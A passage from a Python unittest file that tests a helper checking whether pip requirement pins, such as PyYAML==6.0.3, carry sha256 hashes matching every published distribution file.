        self.assertIn('no Node version', err)


def load_pip_hashes():
    spec = importlib.util.spec_from_file_location('pip_hashes', SKILL / 'pip_hashes.py')
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class PipHashes(unittest.TestCase):
    pip_hashes = load_pip_hashes()
    TEXT = f'PyYAML==6.0.3 \\\n    --hash=sha256:{H[0]} \\\n    --hash=sha256:{H[1]}\n'

    def problems(self, text, files):
        return self.pip_hashes.problems(text, lambda name, version: files[(name, version)])

    def test_every_file_hashed_passes(self):
        self.assertEqual(self.problems(self.TEXT, {('PyYAML', '6.0.3'): {H[0], H[1]}}), [])

    def test_a_file_without_hash_or_a_foreign_hash_fails(self):
        self.assertEqual(len(self.problems(self.TEXT, {('PyYAML', '6.0.3'): {H[0], H[1], H[2]}})), 1)
        self.assertEqual(len(self.problems(self.TEXT, {('PyYAML', '6.0.3'): {H[0]}})), 1)

    def test_no_hashed_pin_fails(self):
        self.assertEqual(self.problems('PyYAML==6.0.3\n', {}), ['no hashed pin'])


if __name__ == '__main__':
    unittest.main()
